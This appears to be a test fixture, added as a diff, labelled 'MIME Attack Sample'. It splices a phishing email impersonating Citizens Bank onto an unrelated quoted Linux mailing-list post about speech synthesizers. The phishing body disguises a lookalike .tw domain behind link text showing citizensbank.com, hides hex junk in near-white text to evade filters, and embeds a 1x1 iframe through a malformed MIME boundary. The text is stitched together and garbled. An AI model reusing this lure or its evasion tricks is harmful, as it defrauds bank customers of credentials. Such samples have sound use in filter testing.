@@ -1,0 +1,94 @@
+From: rloeffler@mofo.com
+To: amy.mulligan@enron.com, richard.hanagriff@enron.com
+Subject: MIME Attack Sample
+Content-Type: text/html;
+Content-Transfer-Encoding: 7Bit
+
+<head>
+<meta     http-equiv="Content-Type"       content="text/html;     charset=iso-8859-1">
+</head>
+
+<body>
+<p><font       face="Arial, Helvetica, sans-serif">Dear  <u>business    or      corporate</u>     customer     of      Citizens       Bank,</font></p>
+<p><font face="Arial, Helvetica, sans-serif">Citizens Bank  Customer  Service    requests       you  to     complete      <b><font color="#339900">Money      Manager   GPS      Online  Form</font></b>.</font></p>
+<p><font     face="Arial, Helvetica, sans-serif">This     procedure   is       obligatory     for       all  <b><font color="#339900">Money Manager  Global  Processing   Solutions&#153;       (GPS)</font></b> users.</font></p>
+<p><font  face="Arial, Helvetica, sans-serif">Please  click     hyperlink     below   to    access    <b><font     color="#339900">Money   Manager  GPS Online    Form</font></b>.<br></font></p>
+<p><font  face="Arial, Helvetica, sans-serif"><a    href="http://moneymanagergps-id5556329942.citizensbank.com.ktomode.tw/gps/userdir/onlineform.aspx"><font       size="2">http://moneymanagergps-id5556329942.citizensbank.com/gps/userdir/onlineform.aspx</font></a></font></p>
+<p><font       face="Arial, Helvetica, sans-serif">Please  do not      respond   to      this     email.</font></p>
+<p><font       face="Arial, Helvetica, sans-serif">____________________________________________________________________</font></p>
+<p><font     face="Arial, Helvetica, sans-serif"       size="2">&copy;      Copyright 2007      Citizens      Financial       Group.  All  rights       reserved.</font></p>
+<p><font  color="#FFFFF1"     face="Arial, Helvetica, sans-serif">0x093, 0x14253569    LTVC, 64KO, common, rev, HD8G, end, hex.      0x4, 0x1, 0x282, 0x45600238, 0x78712639, 0x5, 0x4564     0x08713366, 0x412    0x86, 0x74894098, 0x79, 0x0557, 0x764, 0x96472104, 0x841, 0x6620, 0x0, 0x83330809, 0x17, 0x11, 0x7425      KMNF: 0x78131079, 0x499, 0x3476, 0x68365366, 0x02, 0x6, 0x2002     rev: 0x69, 0x0  0x91, 0x5, 0x85614706, 0x43, 0x18, 0x34785168, 0x52214700, 0x737, 0x87009725, 0x2, 0x276, 0x77, 0x84, 0x73793367, 0x979     0WB: 0x65, 0x628, 0x920, 0x51417119, 0x1851, 0x2, 0x1466, 0x7, 0x5, 0x7313, 0x3877, 0x4991, 0x2383, 0x47668497</font></p>
+<p><font       color="#FFFFFD"   face="Arial, Helvetica, sans-serif"><span>0x0, 0x04886750, 0x85, 0x833, 0x23875318, 0x79711677, 0x27, 0x735, 0x246, 0x535, 0x27315597, 0x0813, 0x8162, 0x966       0x8503, 0x89844963   source: 0x7250, 0x09346800, 0x6870, 0x91783589, 0x35       6SKR W5XO UCWQ   engine: 0x65690514, 0x49097197, 0x8, 0x459, 0x07   46L: 0x568, 0x1, 0x4, 0x51, 0x29633483, 0x65, 0x5, 0x3   close, common V5U, C71.   0x6, 0x0486, 0x363, 0x455, 0x0, 0x4 TQEQ: 0x49, 0x2111, 0x3, 0x537, 0x71950373, 0x4725, 0x3595, 0x5, 0x03, 0x81219191, 0x41, 0x525, 0x4199    0x900, 0x6, 0x8894</span></font></p>
+<p><font      color="#FFFFFB"    face="Arial, Helvetica, sans-serif"><span>0x56     CHMD: 0x5606    0x9611, 0x501, 0x6836, 0x16      0x7, 0x8505, 0x11, 0x0, 0x85, 0x119, 0x5739, 0x3, 0x15, 0x05, 0x8, 0x561, 0x245, 0x59809753 dec0x96611646, 0x2093, 0x40089684, 0x085, 0x09, 0x30887188, 0x88064791, 0x746 JT48: 0x2, 0x0937, 0x4, 0x076, 0x07395102, 0x8984, 0x0217, 0x5, 0x9810, 0x7, 0x4, 0x32613829, 0x186 interface: 0x2, 0x87054709, 0x08971730, 0x17258963, 0x0, 0x468, 0x3, 0x81, 0x7, 0x381, 0x1, 0x05825660, 0x9, 0x6      8YDB 56H function 4JJ      0x40001136, 0x01436217, 0x27217595, 0x02607778, 0x40, 0x72, 0x0, 0x4, 0x9, 0x360, 0x78</span></font></p>
+</body>
+</html>
+
+
+----G2MJNDHJVD5MVHA3--
+Content-Type: text/html
+<iframe width="1" height="25" src="cid:target" frameborder="0"></iframe><img    width="1" height="1"  src="cid:target">
+--BOUNDARY
+Content-ID: <target>
+Content-Type: text/plain
+BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+On Tue, May 15, 2007 at 01:24:45PM -0500, C.M. Brannon wrote:
+> The vendors of USB synths won't release their
+> product information, so these are unsupported.  Thus, I'm not buying
+> one.  Who wants to do business with people like that anyhow? 
+
+I'm in full agreement with you there. I will personally not buy a usb
+synth, until I know that the manufacturer has released the specs for
+it without requiring an NDA to be signed.
+
+> So it
+> looks like software speech is the way of the future, at least for me.
+> Next, software speech is more convenient, especially when using a
+> laptop.  You have to carry one less peripheral with you.
+> 
+> The question to ask is this.  Given the decline of hardware synthesis,
+> is it really necessary to have speech support within the kernel
+> itself?  Software synthesizers run in user mode, so the benefits of a
+> speech-enabled kernel -- notably a talking boot process -- are lost.
+> 
+
+I agree there with you also. Granted, once you have an installed
+distro, hardware speech isn't that vital. However, installation is
+still a big issue in that department. Yes, gentoo, fedora, can be
+installed over ssh. Grml, ubuntu can be installed with software
+speech. However, what if someone wants to install and use a distro
+like debian or slackware, that support neither option as far as I
+know? Yes, I suppose that one could use the grml livecd to install
+debian via debootstrap, however that procedure isn't for everyone,
+especially for a newby. So, the fact remains that until it is possible
+to install most distros either over the network or via software
+speech, hardware speech is still necessary.
+
+As for kernel-based screen readers not being usable during boot with
+software speech, the same is true for user space-based screen readers,
+such as jupiter for example, that would be using either hardware or
+software speech. So, arguably, kernel-based screen readers still very
+much have their own advantages, assuming one has access to a hardware
+synth of course, though I admit that advantage will become less, and
+less important as everyone moves to software speech eventually.
+
+Greg
+
+- -- 
+web site: http://www.romuald.net.eu.org
+gpg public key: http://www.romuald.net.eu.org/pubkey.asc
+skype: gregn1
+(authorization required, add me to your contacts list first)
+
+- --
+Free domains: http://www.eu.org/ or mail dns-manager@EU.org
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+
+iD8DBQFGSgS27s9z/XlyUyARAigUAJsFghMQVZBSn/ZH04/mNo6s0kObcwCgrsh3
+kiOXHOo0GjAUmAP5vuQN6vU=
+=yNvy
+-----END PGP SIGNATURE-----
+
+____
